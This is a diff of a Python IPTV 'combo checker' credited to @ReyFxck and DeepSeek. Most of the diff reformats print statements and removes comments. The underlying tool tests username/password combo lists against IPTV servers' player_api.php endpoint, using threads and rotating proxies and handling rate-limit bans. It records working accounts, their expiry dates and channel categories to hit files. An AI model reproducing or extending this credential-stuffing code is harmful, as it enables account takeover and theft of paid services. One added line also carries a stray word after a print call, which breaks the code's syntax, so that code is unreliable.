+        print("{}[ERRO CONFIG PROXY] {}{}".format(cor.vermelho, e, cor.reset))
         return None
 
-# Função para converter timestamp em data legível (formato DD.MM.YYYY - HH:MM)
 def converter_data(timestamp, t=None):
     try:
         return datetime.fromtimestamp(int(timestamp)).strftime('%d.%m.%Y - %H:%M')
@@ -767,7 +712,7 @@ def test_account(username, password, proxy_config, server, headers, t, escolha_c
             if response.status_code == 429:
                 if config.get("pausar_429", {}).get("ativo"):
                     tempo = config.get("pausar_429", {}).get("tempo", 60)
-                    print(f"{cor.amarelo}[429] Pausando por {tempo} segundos...{cor.reset}")
+                    print("{}[429] Pausando por {} segundos...{}".format(cor.amarelo, tempo, cor.reset))
                     time.sleep(tempo)
                 return "ban", username, password, None, None, response.status_code, None
 
@@ -787,8 +732,7 @@ def test_account(username, password, proxy_config, server, headers, t, escolha_c
                         exp_date = user_info.get("exp_date", data.get("exp_date"))
                         exp_date = t("checker.unlimited_time") if exp_date is None else converter_data(exp_date, t)
 
-                        # AQUI ESTÁ A MUDANÇA: Verifica a escolha antes de buscar
-                        if escolha_categoria != "1": # "1" é a opção "Nada"
+                        if escolha_categoria != "1":
                             user_info["categorias"] = buscar_categorias(
                                 server, username, password, proxy_config, headers, config, escolha_categoria
                             )
@@ -829,21 +773,21 @@ def test_account(username, password, proxy_config, server, headers, t, escolha_c
             continue
 
         except requests.exceptions.ProxyError as e:
-            print(f"{cor.vermelho}[DEBUG PROXY ERROR] {e}{cor.reset}")
+            print("{}[DEBUG PROXY ERROR] {}{}".format(cor.vermelho, e, cor.reset))
             return "proxy_error", username, password, None, None, "Proxy Error", None
 
         except requests.exceptions.ConnectionError as e:
             if config.get("pausar_queda_internet", False):
-                print(f"{cor.amarelo}[Sem conexão] Pausando e tentando reconectar...{cor.reset}")
+                print("{}[Sem conexão] Pausando e tentando reconectar...{}".format(cor.amarelo, cor.reset))
                 while True:
                     try:
                         requests.get("http://clients3.google.com/generate_204", timeout=5)
-                        print(f"{cor.verde}[Conexão recuperada!]{cor.reset}")
+                        print("{}[Conexão recuperada!]{}".format(cor.verde, cor.reset))
                         break
                     except:
                         time.sleep(2)
             else:
-                print(f"{cor.vermelho}[DEBUG CONNECTION ERROR] {e}{cor.reset}")
+                print("{}[DEBUG CONNECTION ERROR] {}{}".format(cor.vermelho, e, cor.reset))
                 return "connection_error", username, password, None, None, "Connection Error", None
 
         except requests.exceptions.RequestException:
@@ -857,21 +801,19 @@ def buscar_categorias(server, username, password, proxy_config, headers, config,
     Busca categorias com base na escolha do usuário, suportando múltiplos formatos de resposta da API.
     """
     categorias_encontradas = {}
-    
-    # Mapeamento da escolha para os tipos de categoria a buscar
+
     mapa_escolha = {
-        "2": ["live", "vod", "series"], # Tudo
-        "3": ["live", "vod"],           # Ao vivo, Filmes
-        "4": ["vod", "series"],         # Filmes, Séries
-        "5": ["live"],                  # Apenas Ao vivo
-        "6": ["vod"],                   # Apenas Filmes
-        "7": ["series"],                # Apenas Séries
-        "8": ["live", "series"]         # Apenas Ao vivo, Séries
+        "2": ["live", "vod", "series"],
+        "3": ["live", "vod"],  
+        "4": ["vod", "series"],
+        "5": ["live"],
+        "6": ["vod"],
+        "7": ["series"],
+        "8": ["live", "series"]
     }
     
     tipos_a_buscar = mapa_escolha.get(escolha, [])
-    
-    # Itera sobre os tipos de conteúdo que o usuário escolheu (live, vod, series)
+
     for tipo in tipos_a_buscar:
         action = f"get_{tipo}_categories"
         url = f"http://{server}/player_api.php?username={username}&password={password}&action={action}"
@@ -890,37 +832,34 @@ def buscar_categorias(server, username, password, proxy_config, headers, config,
                     try:
                         dados = response.json()
                         nomes_categorias = []
-                        
-                        # AQUI ESTÁ A LÓGICA DA SUA FUNÇÃO ORIGINAL, AGORA INTEGRADA
+
                         if isinstance(dados, list):
-                            # Formato direto: [{"category_id":1,"category_name":"Nome"},...]
+
                             nomes_categorias = [cat.get("category_name", "Desconhecida") for cat in dados]
                         elif isinstance(dados, dict):
-                            # Formato encapsulado: {"categories": [...]}
+
                             if 'categories' in dados and isinstance(dados['categories'], list):
                                 nomes_categorias = [cat.get("category_name", "Desconhecida") for cat in dados['categories']]
-                            # Formato alternativo: {"live_categories": [...]}
+
                             elif f'{tipo}_categories' in dados and isinstance(dados[f'{tipo}_categories'], list):
                                 nomes_categorias = [cat.get("category_name", "Desconhecida") for cat in dados[f'{tipo}_categories']]
 
                         if nomes_categorias:
                             prefixo = {"live": "AO VIVO", "vod": "FILME", "series": "SÉRIE"}[tipo]
                             categorias_encontradas[prefixo] = nomes_categorias
-                        
-                        # Se a requisição foi bem-sucedida, para de tentar para este tipo
+
                         break 
                         
                     except json.JSONDecodeError:
-                        print(f"{cor.amarelo}[AVISO] Resposta da API para '{tipo}' não é JSON (tentativa {tentativa + 1}/{max_tentativas}){cor.reset}")
+                        print("{}[AVISO] Resposta da API para '{}' não é JSON (tentativa {}/{}){}".format(cor.amarelo, tipo, tentativa + 1, max_tentativas, cor.reset))
                         if tentativa == max_tentativas - 1: break
                         time.sleep(1)
                 
             except requests.exceptions.RequestException as e:
-                print(f"{cor.amarelo}[AVISO] Erro na requisição para '{tipo}': {e} (tentativa {tentativa + 1}/{max_tentativas}){cor.reset}")
+                print("{}[AVISO] Erro na requisição para '{}': {} (tentativa {}/{}){}".format(cor.amarelo, tipo, e, tentativa + 1, max_tentativas, cor.reset))
                 if tentativa == max_tentativas - 1: break
                 time.sleep(1)
-    
-    # Formata a saída para exibição no arquivo de hit
+
     resultado_final = []
     for prefixo, nomes in categorias_encontradas.items():
         for nome in nomes:
@@ -956,7 +895,7 @@ def contar_streams(server, username, password, proxy_config, headers, config):
             except:
                 continue
         else:
-            resultado[chave] = -1  # falha total
+            resultado[chave] = -1
 
     return resultado
 
@@ -969,7 +908,7 @@ def salvar_hit(server, username, password, status, exp_date, user_info, caminho_
 
         with open(caminho_arquivo, "a", encoding="utf-8") as f:
             f.write("=====[ DEEPSEEK CHECKER ]=====\n")
-            f.write("DeepSeek Checker V6 - Revision 4\n")
+            f.write("DeepSeek Checker V6 - Revision 5\n")
             f.write("Coded by DeepSeek & ReyFxck Th.\n")
             f.write(f'{t("traduce.traduce_hit") if t else "HIT"}\n')
             f.write("=====[ HOST INFORMATION ]=====\n")
@@ -1041,19 +980,17 @@ def salvar_hit(server, username, password, status, exp_date, user_info, caminho_
                         for i, item in enumerate(itens, 1):
                             prefixo = f"{i}. " if cat_cfg.get("enumerate_categories", True) else ""
                             f.write(f"{prefixo}{item}\n")
-                    else: # Modo unido
+                    else:
                         linha_formatada = []
                         for i, item in enumerate(itens, 1):
                             prefixo = f"{i}." if cat_cfg.get("enumerate_categories", True) else ""
-                            
-                            # LÓGICA CORRIGIDA: Aplica emoji ou texto simples, sem misturar.
+
                             if decoracao_style == "emoji":
                                 prefixo_num = f"{i}." if cat_cfg.get("enumerate_categories", True) else ""
                                 linha_formatada.append(f" {emojis.get(tipo, '')} {prefixo_num} {item}")
                             else:
                                linha_formatada.append(f"{prefixo}{item}")
-                        
-                        # LÓGICA CORRIGIDA: O separador só é usado se o estilo NÃO for emoji.
+
                         if decoracao_style == "emoji":
                             separador = ""
                         else:
@@ -1067,7 +1004,7 @@ def salvar_hit(server, username, password, status, exp_date, user_info, caminho_
 
     except Exception as e:
         error_msg = t("responses.error_saving_file") if t else "Error saving file"
-        print(f"{cor.vermelho}{error_msg} {e}{cor.reset}")
+        print("{}{} {}{}".format(cor.vermelho, error_msg, e, cor.reset))
 
 
 def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans,
@@ -1181,7 +1118,7 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
                     t=t
                 )
         except Exception as e:
-            print(f"{cor.vermelho}[ERRO NA THREAD] {e}{cor.reset}")
+            print("{}[ERRO NA THREAD] {}{}{}".format(cor.vermelho, e, cor.reset, ))
             traceback.print_exc()
 
     threads = []
@@ -1201,13 +1138,11 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
 
 def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans, usar_proxy, proxies_bons_count=None, proxies_ruins_count=None, tipo_proxy=None, arquivo_proxy=None, proxy_escolhida=None, config=None, t=None):
     """Exibe as informações de verificação com banner e tabela atualizados"""
-    
-    # Limpa a tela e exibe o banner sempre
+
     output = []
-    output.append("\033[H\033[J")  # Limpa a tela
+    output.append("\033[H\033[J")
     output.append(banner_checking(config, t, return_str=True))
-    
-    # Prepara as informações dinâmicas
+
     deepseek = "\033[38;5;33m DEEPSEEK CHK\033[0m"
     infor_x = "\033[38;5;11m    INFORMATIONS\033[0m"
     
@@ -1222,11 +1157,9 @@ def exibir_informacoes(server, user, password, status_code, linha_atual, total_l
         [f"\033[38;5;188m  Combo: {cor.reset}", f"{linha_atual}/{total_linhas} "],
         [f"\033[38;5;189m  Restam: {cor.reset}", f" {total_linhas - linha_atual} "]
     ]
-    
-    # Adiciona a tabela ao buffer
+
     output.append(tabulate(tabela_host, headers=[deepseek, infor_x], tablefmt="pretty"))
-    
-    # Se estiver usando proxy, adiciona informações de proxy
+
     if usar_proxy == "1":
         tipo_proxy_str = {
             1: "HTTP/HTTPS",
@@ -1244,8 +1177,7 @@ def exibir_informacoes(server, user, password, status_code, linha_atual, total_l
             ["BANNED", f"{cor.amarelo}{bans}{cor.reset}"]
         ]
         output.append(tabulate(tabela_proxies, tablefmt="pretty"))
-    
-    # Exibe tudo de uma vez
+
     print("\n".join(output))
     sys.stdout.flush()
 
@@ -1255,45 +1187,42 @@ def banner_checking(config, t, return_str=False):
     banner_color = config.get("banner_color", "90m")
     
     if banner_color == "rgb":
-        # Estado persistente entre chamadas
+
         if not hasattr(banner_checking, 'color_state'):
             banner_checking.color_state = {
-                'current': 16,      # Começa no 16 (preto)
-                'direction': 1,     # 1 = crescente, -1 = decrescente
-                'sequence_num': 0,  # 0 = normal, 1-5 = invertida
-                'step': 0           # Contador de passos (0-5)
+                'current': 16,
+                'direction': 1,
+                'sequence_num': 0,
+                'step': 0
             }
         
         state = banner_checking.color_state
 
-        # Lógica da sequência de cores
-        if state['sequence_num'] == 0:  # Sequência NORMAL (6 cores crescentes)
+        if state['sequence_num'] == 0:
             if state['step'] < 5:
                 state['current'] += 1
                 state['step'] += 1
             else:
                 state['sequence_num'] = 1
                 state['direction'] = -1
-                state['current'] = state['current'] + 11  # Pula para início da 1ª sequência invertida
+                state['current'] = state['current'] + 11
                 state['step'] = 0
-        else:  # Sequências INVERTIDAS (5 sequências de 6 cores decrescentes)
+        else:
             if state['step'] < 5:
                 state['current'] += state['direction']
                 state['step'] += 1
             else:
                 state['sequence_num'] += 1
-                if state['sequence_num'] > 5:  # Reinicia após 5 sequências invertidas
+                if state['sequence_num'] > 5:
                     state['sequence_num'] = 0
                     state['direction'] = 1
-                    state['current'] = state['current'] + 6  # Próximo bloco normal
+                    state['current'] = state['current'] + 6
                 else:
-                    state['current'] = state['current'] + 12  # Próxima sequência invertida
+                    state['current'] = state['current'] + 12
                 state['step'] = 0
 
-        # Garante que a cor está entre 16-255
         state['current'] = max(16, min(state['current'], 255))
 
-        # Banner com a cor atual (TODO o banner na mesma cor)
         banner_text = f"""\033[38;5;{state['current']}m
         ____                 ____            _    
        |  _ \\  ___  ___ _ __/ ___|  ___  ___| | __
@@ -1309,10 +1238,10 @@ def banner_checking(config, t, return_str=False):
 {cor.c_purple}
             DEEPSEEK IPTV CHECKER BY @ReyFxck
             GitHub https://github.com/ReyFxck
-            Script Python, Version: 6 Rev: 04{cor.reset}
+            Script Python, Version: 6 Rev: 05{cor.reset}
             Translated by: {t('traduce.traduce_json', default='Json não carregado')}{cor.reset}\n"""
     
-    else:  # Modo azul padrão
+    else:
         banner_text = f"""\033[38;5;33m
         ____                 ____            _    
        |  _ \\  ___  ___ _ __/ ___|  ___  ___| | __
@@ -1328,7 +1257,7 @@ def banner_checking(config, t, return_str=False):
 {cor.c_purple}
             DEEPSEEK IPTV CHECKER BY @ReyFxck
             GitHub https://github.com/ReyFxck
-            Script Python, Version: 6 Rev: 04{cor.reset}
+            Script Python, Version: 6 Rev: 05{cor.reset}
             Translated by: {t('traduce.traduce_json', default='Json não carregado')}{cor.reset}\n"""
 
     if return_str:
@@ -1336,47 +1265,52 @@ def banner_checking(config, t, return_str=False):
     print(banner_text, end='')
 
 
-# ==============================================
-# MENUS E FLUXO PRINCIPAL
-# ==============================================
 def mostrar_menu_principal(config, t):
     banner(config, t)
-    print(f"\n{cor.ciano}  ===== {t('menu.main_title', 'MAIN MENU')} ====={cor.reset}")
-    print(f"{cor.atention}  {t('menu.choose_option', 'Please make a choice!')}{cor.reset}")
-    print(f"{cor.azul}  = [1] {t('menu.menu_start', 'START CHECKER SCAN')}{cor.reset}")
-    print(f"{cor.azul}  = [2] {t('menu.settings', 'GLOBAL SETTINGS')}{cor.reset}")
-    print(f"{cor.azul}  = [3] {t('menu.exit_script', 'EXIT SCRIPT')}{cor.reset}")
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+    print("\n{}  ===== {} ====={}".format(cor.ciano, t('menu.main_title', 'MAIN MENU'), cor.reset))
+    print("{}  {}{}".format(cor.atention, t('menu.choose_option', 'Please make a choice!'), cor.reset))
+    print("{}  = [1] {}{}".format(cor.azul, t('menu.menu_start', 'START CHECKER SCAN'), cor.reset))
+    print("{}  = [2] {}{}".format(cor.azul, t('menu.settings', 'GLOBAL SETTINGS'), cor.reset))
+    print("{}  = [3] {}{}".format(cor.azul, t('menu.exit_script', 'EXIT SCRIPT'), cor.reset))
+    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
     
     while True:
-        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
+        escolha = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         if escolha in ("1", "2", "3"):
             if escolha == "3":
                 banner(config, t)
-                print(f"\n  {cor.amarelo}{t('menu.exit_info1')}{cor.reset}")
-                print(f"  {cor.verde}{t('menu.exit_info2')}{cor.reset}")
-                print(f"  {cor.azul}{t('menu.exit_info3')}{cor.reset}")
-                print(f"  {cor.white_n}{t('menu.exit_info4')}{cor.reset}")
+                print("\n  {}{}{}".format(cor.amarelo, t('menu.exit_info1'), cor.reset))
+                print("  {}{}{}".format(cor.verde, t('menu.exit_info2'), cor.reset))
+                print("  {}{}{}".format(cor.azul, t('menu.exit_info3'), cor.reset))
+                print("  {}{}{}".format(cor.white_n, t('menu.exit_info4'), cor.reset))
                 sys.exit(0)
             return escolha
-        print(f"\n{cor.vermelho}  {t('responses.invalid_option', 'Invalid option!')}{cor.reset}")
+        print("\n{}  {}{}".format(cor.vermelho, t('responses.invalid_option', 'Invalid option!'), cor.reset))
 
 
 def mostrar_menu_configuracoes(config, t):
     """Menu de configurações com opções de idioma, SO, categorias, banner e requisições"""
     while True:
         banner(config, t)
-        print(f'\n{cor.ciano}  === {t('settings_title', 'SETTINGS')} ==={cor.reset}')
-        print(f"{cor.azul}  = [1] {t('change_language', 'Change Language')} (Atual: {config['idioma']}){cor.reset}")
-        print(f'{cor.azul}  = [2] {t('change_os', 'Change operating system')} (Atual: {config.get('sistema_operacional', 'Não configurado')}){cor.reset}')
-        print(f'{cor.azul}  = [3] {t('menu.categoria_menu', 'CATEGORY SETTINGS')}{cor.reset}')
-        print(f'{cor.azul}  = [4] {t('menu.banner_settings', 'BANNER SETTINGS')}{cor.reset}')
-        print(f'{cor.azul}  = [5] Configurações de Requisição{cor.reset}')
-        print(f'{cor.azul}  = [6] Configurar informações do HIT{cor.reset}')
-        print(f'{cor.azul}  = [7] {t('save_exit', 'Save and exit')}{cor.reset}')
-        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+        print("\n{}  === {} ==={}".format(cor.ciano, t('settings_title', 'SETTINGS'), cor.reset))
+        print("{}  = [1] {} (Atual: {}){}".format(cor.azul, t('change_language', 'Change Language'), config['idioma'], cor.reset))
+        print("{}  = [2] {} (Atual: {}){}".format(cor.azul, t('change_os', 'Change operating system'), config.get('sistema_operacional', 'Não configurado'), cor.reset))
+        print("{}  = [3] {}{}".format(cor.azul, t('menu.categoria_menu', 'CATEGORY SETTINGS'), cor.reset))
+        print("{}  = [4] {}{}".format(cor.azul, t('menu.banner_settings', 'BANNER SETTINGS'), cor.reset)) um
+        print("{}  = [5] Configurações de Requisição{}".format(cor.azul, cor.reset))
+        print("{}  = [6] Configurar informações do HIT{}".format(cor.azul, cor.reset))
+        print("{}  = [7] {}{}".format(cor.azul, t('save_exit', 'Save and exit'), cor.reset))
+        print("{}{}{}  ".format(cor.ciano, "=" * 26, cor.reset))
         
-        escolha = input(f'{cor.verde}  {t('responses.response')} >>> {cor.reset}').strip()
+        escolha = input("\n  {}{} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         
         if escolha == '1':
             config['idioma'] = selecionar_idioma()
@@ -1394,10 +1328,9 @@ def mostrar_menu_configuracoes(config, t):
             salvar_configuracao(config)
             break
         else:
-            print(f'{cor.vermelho}{t('invalid_option', 'Opção inválida!')}{cor.reset}')
+            print("{}{}{}".format(cor.vermelho, t('invalid_option', 'Opção inválida!'), cor.reset))
 
 
-# Função para configurar o banner:
 def configurar_banner(config, t):
     """Menu para configurar as opções do banner"""
     while True:
@@ -1405,52 +1338,64 @@ def configurar_banner(config, t):
         current_color = config.get("banner_color", "90m")
         color_name = "Azul padrão (90m)" if current_color == "90m" else "RGB (multicolorido)"
         
-        print(f"\n{cor.ciano}  === CONFIGURAÇÕES DO BANNER ==={cor.reset}")
-        print(f"{cor.azul}  [1] Cor do banner (Atual: {color_name}){cor.reset}")
-        print(f"{cor.azul}  [2] Voltar{cor.reset}")
-        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+        print("\n{}  === CONFIGURAÇÕES DO BANNER ==={}".format(cor.ciano, cor.reset))
+        print("{}  [1] Cor do banner (Atual: {}){}".format(cor.azul, color_name, cor.reset))
+        print("{}  [2] Voltar{}".format(cor.azul, cor.reset))
+        print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
 
-        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
+        escolha = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         
         if escolha == "1":
-            print(f"\n{cor.ciano}Selecione o estilo do banner:{cor.reset}")
-            print(f"{cor.azul}[1] Azul padrão (90m){cor.reset}")
-            print(f"{cor.azul}[2] RGB (multicolorido){cor.reset}")
-            color_choice = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
+            print("\n{}Selecione o estilo do banner:{}".format(cor.ciano, cor.reset))
+            print("{}[1] Azul padrão (90m){}".format(cor.azul, cor.reset))
+            print("{}[2] RGB (multicolorido){}".format(cor.azul, cor.reset))
+            color_choice = input("{}  {} >>> {}".format(
+                cor.verde,
+                t('responses.response'),
+                cor.reset
+            )).strip()
             
             if color_choice == "1":
                 config["banner_color"] = "90m"
             elif color_choice == "2":
                 config["banner_color"] = "rgb"
             else:
-                print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+                print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
                 continue
                 
-            salvar_configuracao(config)  # Salva imediatamente a escolha
-            print(f"{cor.verde}Configuração do banner salva!{cor.reset}")
+            salvar_configuracao(config)
+            print("{}Configuração do banner salva!{}".format(cor.verde, cor.reset))
             time.sleep(1)
         elif escolha == "2":
             break
         else:
-            print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
 
 
 def configurar_requisicoes(config, t):
     """Menu para configurar o comportamento das requisições"""
     while True:
         banner(config, t)
-        print(f"\n{cor.ciano}  === CONFIGURAÇÕES DE REQUISIÇÃO ==={cor.reset}")
-        print(f"{cor.azul}  [1] Tentativas (sem proxy): {config.get('tentativas_sem_proxy', 2)}{cor.reset}")
-        print(f"{cor.azul}  [2] Tentativas (com proxy): {config.get('tentativas_com_proxy', 3)}{cor.reset}")
-        print(f"{cor.azul}  [3] Timeout (sem proxy): {config.get('timeout_sem_proxy', 10)}s{cor.reset}")
-        print(f"{cor.azul}  [4] Timeout (com proxy): {config.get('timeout_com_proxy', 15)}s{cor.reset}")
-        print(f"{cor.azul}  [5] Pausar se cair a internet: {'ON' if config.get('pausar_queda_internet') else 'OFF'}{cor.reset}")
+        print("\n{}  === CONFIGURAÇÕES DE REQUISIÇÃO ==={}".format(cor.ciano, cor.reset))
+        print("{}  [1] Tentativas (sem proxy): {}{}".format(cor.azul, config.get('tentativas_sem_proxy', 2), cor.reset))
+        print("{}  [2] Tentativas (com proxy): {}{}".format(cor.azul, config.get('tentativas_com_proxy', 3), cor.reset))
+        print("{}  [3] Timeout (sem proxy): {}s{}".format(cor.azul, config.get('timeout_sem_proxy', 10), cor.reset))
+        print("{}  [4] Timeout (com proxy): {}s{}".format(cor.azul, config.get('timeout_com_proxy', 15), cor.reset))
+        print("{}  [5] Pausar se cair a internet: {}{}".format(cor.azul, 'ON' if config.get('pausar_queda_internet') else 'OFF', cor.reset))
         print(f"{cor.azul}  [6] Pausar ao receber 429: {'ON' if config.get('pausar_429', {}).get('ativo') else 'OFF'} ({config.get('pausar_429', {}).get('tempo', 60)}s){cor.reset}")
-        print(f"{cor.azul}  [7] Pausar ao receber 403: {'ON' if config.get('pausar_403') else 'OFF'}{cor.reset}")
-        print(f"{cor.azul}  [8] Voltar{cor.reset}")
-        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
+        print("{}  [7] Pausar ao receber 403: {}{}".format(cor.azul, 'ON' if config.get('pausar_403') else 'OFF', cor.reset))
+        print("{}  [8] Voltar{}".format(cor.azul, cor.reset))
+        print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
 
-        escolha = input(f"{cor.verde}>>> {cor.reset}").strip()
+        escolha = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
 
         if escolha == "1":
             novo = input(f"{cor.ciano}Tentativas sem proxy:{cor.reset} ").strip()
@@ -1472,7 +1417,17 @@ def configurar_requisicoes(config, t):
             novo_estado = not atual
             config["pausar_429"]["ativo"] = novo_estado
             if novo_estado:
-                tempo = input(f"{cor.ciano}Tempo de pausa ao receber 429 (s):{cor.reset} ").strip()
+                print("{}  [6] Pausar ao receber 429: {} ({}){}".format(
+                    cor.azul,
+                    'ON' if config.get('pausar_429', {}).get('ativo') else 'OFF',
+                    config.get('pausar_429', {}).get('tempo', 60),
+                    cor.reset
+                ))
+                tempo = input("{}Tempo de pausa ao receber 429 (s): {} >>> {}".format(
+                    cor.ciano,
+                    cor.reset,
+                    cor.verde
+                )).strip()
                 if tempo.isdigit():
                     config["pausar_429"]["tempo"] = int(tempo)
         elif escolha == "7":
@@ -1482,30 +1437,33 @@ def configurar_requisicoes(config, t):
             salvar_configuracao(config)
             break
         else:
-            print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
 
 
-# Adicionar nova função para selecionar tipo de categoria
 def selecionar_tipo_categoria(config, t):
     """Permite ao usuário escolher o formato de exibição das categorias"""
     banner(config, t)
-    print(f"\n{cor.ciano}  === {t('menu.categoria_title', 'CONF. DE CATEGORIAS')} ==={cor.reset}")
-    print(f"{cor.azul}  [1] {t('menu.categoria_empilhado', 'Empilhado')} (Atual: {'[✓]' if config['categoria_tipo'] == 'empilhado' else '[X]'}){cor.reset}")
-    print(f"    [1] CHANNEL | X")
-    print(f"    [2] CHANNEL | Y")
-    print(f"    [3] CHANNEL | Z")
-    print(f"{cor.azul}  [2] {t('menu.categoria_unido', 'Unido')} (Atual: {'[✓]' if config['categoria_tipo'] == 'unido' else '[X]'}){cor.reset}")
-    print(f"    [1] CHANNEL | X • [2] CHANNEL | Y • [3] CHANNEL | Z")
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+    print("\n{}  === {} ==={}".format(cor.ciano, t('menu.categoria_title', 'CONF. DE CATEGORIAS'), cor.reset))
+    print("{}  [1] {} (Atual: {}){}".format(cor.azul, t('menu.categoria_empilhado', 'Empilhado'), '[✓]' if config['categoria_tipo'] == 'empilhado' else '[X]', cor.reset))
+    print("    [1] CHANNEL | X")
+    print("    [2] CHANNEL | Y")
+    print("    [3] CHANNEL | Z")
+    print("{}  [2] {} (Atual: {}){}".format(cor.azul, t('menu.categoria_unido', 'Unido'), '[✓]' if config['categoria_tipo'] == 'unido' else '[X]', cor.reset))
+    print("    [1] CHANNEL | X • [2] CHANNEL | Y • [3] CHANNEL | Z")
+    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
 
     while True:
-        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
+        escolha = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         if escolha == "1":
             return "empilhado"
         elif escolha == "2":
             return "unido"
         else:
-            print(f"{cor.vermelho}{t('responses.invalid_option')}{cor.reset}")
+            print("{}{}{}".format(cor.vermelho, t('responses.invalid_option'), cor.reset))
 
 
 def configurar_categoria(config, t):
@@ -1514,28 +1472,30 @@ def configurar_categoria(config, t):
         cat_cfg = config.get("category_settings", {})
         banner(config, t)
 
-        # Status atuais para exibição no menu
         layout = cat_cfg.get('layout_style', 'empilhado').upper()
         use_header = f"{cor.verde}ON{cor.reset}" if cat_cfg.get('use_type_headers', True) else f"{cor.vermelho}OFF{cor.reset}"
         show_count = f"{cor.verde}ON{cor.reset}" if cat_cfg.get('show_count_in_list', False) else f"{cor.vermelho}OFF{cor.reset}"
         enumerate_cat = f"{cor.verde}ON{cor.reset}" if cat_cfg.get('enumerate_categories', True) else f"{cor.vermelho}OFF{cor.reset}"
-        
-        # LÓGICA CORRIGIDA: Mostra "EMOJI" ou o separador atual.
+
         if cat_cfg.get('decoracao_style') == 'emoji':
             current_decor = 'EMOJI'
         else:
             current_decor = f"'{cat_cfg.get('join_separator', ' • ')}'"
 
-        print(f"\n{cor.ciano}  === CONFIGURAÇÕES DE CATEGORIA ==={cor.reset}")
-        print(f"{cor.azul}  [1] Estilo da Lista (Atual: {layout}){cor.reset}")
-        print(f"{cor.azul}  [2] Usar Cabeçalho de Tipo (Atual: {use_header}){cor.reset}")
-        print(f"{cor.azul}  [3] Estilo de Decoração (Atual: {current_decor}){cor.reset}")
-        print(f"{cor.azul}  [4] Numerar Categorias (Atual: {enumerate_cat}){cor.reset}")
-        print(f"{cor.azul}  [5] Mostrar Contagem na Lista (Atual: {show_count}){cor.reset}")
-        print(f"{cor.azul}  [6] Voltar{cor.reset}")
-        print(f'  {cor.ciano}{"=" * 45}{cor.reset}\n')
+        print("\n{}  === CONFIGURAÇÕES DE CATEGORIA ==={}".format(cor.ciano, cor.reset))
+        print("{}  [1] Estilo da Lista (Atual: {}){}".format(cor.azul, layout, cor.reset))
+        print("{}  [2] Usar Cabeçalho de Tipo (Atual: {}){}".format(cor.azul, use_header, cor.reset))
+        print("{}  [3] Estilo de Decoração (Atual: {}){}".format(cor.azul, current_decor, cor.reset))
+        print("{}  [4] Numerar Categorias (Atual: {}){}".format(cor.azul, enumerate_cat, cor.reset))
+        print("{}  [5] Mostrar Contagem na Lista (Atual: {}){}".format(cor.azul, show_count, cor.reset))
+        print("{}  [6] Voltar{}".format(cor.azul, cor.reset))
+        print("  {}{}{}\n".format(cor.ciano, "=" * 45, cor.reset))
 
-        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
+        escolha = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
 
         if escolha == '1':
             novo_layout = "unido" if cat_cfg.get('layout_style', 'empilhado') == "empilhado" else "empilhado"
@@ -1545,7 +1505,7 @@ def configurar_categoria(config, t):
             config["category_settings"]["use_type_headers"] = not cat_cfg.get('use_type_headers', True)
        
         elif escolha == "3":
-            print(f"\n{cor.ciano}  --- Escolha um Estilo de Decoração ---{cor.reset}")
+            print("\n{}  --- Escolha um Estilo de Decoração ---{}".format(cor.ciano, cor.reset))
             
             decoracoes = {
                 "1": ("•", "Ponto tradicional"),
@@ -1558,27 +1518,35 @@ def configurar_categoria(config, t):
             }
             
             for key, (sep, desc) in decoracoes.items():
-                print(f"{cor.azul}  [{key}] {desc.ljust(25)} {sep if key != '6' else '📺🎬🎞️'}{cor.reset}")
+                print("{}  [{}] {} {}{}".format(cor.azul, key, desc.ljust(25), sep if key != '6' else '📺🎬🎞️', cor.reset))
             
-            print(f"{cor.magenta}  [99] CUSTOM (Digitar o seu){cor.reset}")
-            sub_escolha = input(f"\n{cor.verde}  >>> {cor.reset}").strip()
+            print("{}  [99] CUSTOM (Digitar o seu){}".format(cor.magenta, cor.reset))
+            sub_escolha = input("\n{}  {} >>> {}".format(
+                cor.verde,
+                t('responses.response'),
+                cor.reset
+            )).strip()
             
             if sub_escolha in decoracoes:
                 if sub_escolha == "6":
-                    # LÓGICA CORRIGIDA: Define o estilo e remove o separador antigo.
+
                     config["category_settings"]["decoracao_style"] = "emoji"
                     config["category_settings"].pop("join_separator", None)
                 else:
-                    # LÓGICA CORRIGIDA: Define o separador e garante o estilo "normal".
+
                     config["category_settings"]["join_separator"] = decoracoes[sub_escolha][0]
                     config["category_settings"]["decoracao_style"] = "normal"
             elif sub_escolha == "99":
-                print(f"\n{cor.amarelo}Digite o seu separador personalizado:{cor.reset}")
-                novo_separador = input(f"{cor.verde}  >>> {cor.reset}")
